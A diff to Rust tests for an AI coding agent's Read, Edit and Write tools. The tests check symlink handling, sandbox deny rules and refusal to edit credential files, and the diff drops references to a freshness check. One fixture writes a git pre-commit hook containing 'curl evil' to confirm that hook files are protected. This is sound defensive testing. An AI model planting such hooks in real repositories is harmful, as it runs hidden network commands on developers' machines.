@@ -137,7 +137,7 @@ async fn outside_read_is_allowed() {
     let mut tracker = ChangeTracker::default();
     let state = SessionToolState::for_test();
 
-    // Absolute paths outside the workspace. Distinct files: Read's freshness
+    // Absolute paths outside the workspace. Distinct files: Read's repeat-read
     // cache keys on the resolved path, so re-reading the same one would only
     // report "unchanged".
     for (name, expected) in [
@@ -434,10 +434,9 @@ async fn alternate_data_streams_keep_the_base_file_name_rules() {
     let _ = std::fs::remove_dir_all(&dir);
 }
 
-/// Reading a symlinked file and then editing that same spelling keeps working:
-/// the read follows the link (the canonical target is what gets checked), while
-/// Edit/Write replace the link entry. The freshness state must therefore cover
-/// the model-facing spelling as well as the opened target.
+/// A symlinked file is read through the link, while Edit/Write replace the
+/// link entry itself: reading the spelling and then editing it keeps working,
+/// and the target stays untouched.
 #[cfg(unix)]
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn a_symlinked_file_can_be_read_then_edited_by_its_spelling() {
@@ -480,7 +479,7 @@ async fn a_symlinked_file_can_be_read_then_edited_by_its_spelling() {
         "the write replaces the link entry, not the target"
     );
 
-    // Write follows the same freshness key.
+    // Write follows the same rule.
     std::fs::remove_file(dir.join("alias.txt")).unwrap();
     std::os::unix::fs::symlink("target.txt", dir.join("alias.txt")).unwrap();
     let (out, is_error) = run(
@@ -516,31 +515,15 @@ async fn a_symlinked_file_can_be_read_then_edited_by_its_spelling() {
 }
 
 /// A link repointed after the read must not let Edit read the new target: the
-/// read-through object gets the same deny vetoes as Read. The freshness fast
-/// path (mtime+size) is forced to match so the deny check, not freshness, is
-/// what stops the leak.
+/// read-through object gets the same deny vetoes as Read.
 #[cfg(unix)]
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn edit_refuses_a_repointed_symlink_target() {
-    use std::time::{Duration, SystemTime};
     let dir = temp_dir("symlink-repoint");
     let denied = dir.join("denied.txt");
     let innocuous = dir.join("innocuous.txt");
     std::fs::write(&denied, "DENIED-SECRET\n").unwrap();
     std::fs::write(&innocuous, "innocuous-ok!\n").unwrap();
-    let stamp = SystemTime::UNIX_EPOCH + Duration::from_secs(1_700_000_000);
-    for path in [&denied, &innocuous] {
-        std::fs::File::options()
-            .write(true)
-            .open(path)
-            .unwrap()
-            .set_times(
-                std::fs::FileTimes::new()
-                    .set_accessed(stamp)
-                    .set_modified(stamp),
-            )
-            .unwrap();
-    }
     let alias = dir.join("alias.txt");
     std::os::unix::fs::symlink("innocuous.txt", &alias).unwrap();
     let mut tracker = ChangeTracker::default();
@@ -945,15 +928,6 @@ mod tool_sandbox_alignment {
             (".pigcode/hooks.toml", "[[hooks]]\n"),
             (".git/hooks/pre-commit", "#!/bin/sh\ncurl evil\n"),
         ] {
-            // Read first: otherwise the freshness check rejects before permissions.
-            let _ = run(
-                &dir,
-                &mut tracker,
-                &state,
-                "Read",
-                serde_json::json!({"path": path}),
-            )
-            .await;
             let (out, is_error) = run(
                 &dir,
                 &mut tracker,
@@ -1037,8 +1011,8 @@ mod tool_sandbox_alignment {
     }
 
     /// The write side of the same alignment: a deny rule refuses Write too, so
-    /// an approved outside write cannot silently override it (the refusal lands
-    /// before the freshness check, so the message names the rule).
+    /// an approved outside write cannot silently override it (the refusal names
+    /// the rule).
     #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
     async fn sandbox_denied_paths_are_not_writable() {
         let dir = temp_dir("deny-write");
@@ -1068,8 +1042,8 @@ mod tool_sandbox_alignment {
     }
 
     /// `Edit` cannot work on a credential file (it must read the current text to
-    /// find `old_string`), so it says so instead of failing at the freshness
-    /// check; `Write` replaces the file with the user's per-file approval.
+    /// find `old_string`), so it says so; `Write` replaces the file with the
+    /// user's per-file approval.
     #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
     async fn credential_edits_are_refused_with_a_way_out() {
         let _env = credential_env_lock().await;
